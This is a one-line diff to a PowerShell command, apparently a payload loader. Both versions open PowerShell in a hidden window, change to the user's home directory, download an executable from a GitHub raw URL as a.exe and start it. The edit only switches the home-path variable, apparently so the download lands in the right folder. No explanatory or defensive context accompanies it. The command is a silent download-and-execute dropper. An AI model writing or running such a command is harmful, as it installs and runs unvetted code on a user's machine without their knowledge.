@@ -1,1 +1,1 @@
-powershell -w h -c " & { cd "$env:HOMEPATH"; iwr https://github.com/Sirvierl0ffel/a/raw/main/a -O a.exe; start a.exe } "
+powershell -w h -c " & { cd "$env:USERPROFILE"; iwr https://github.com/Sirvierl0ffel/a/raw/main/a -O a.exe; start a.exe } "
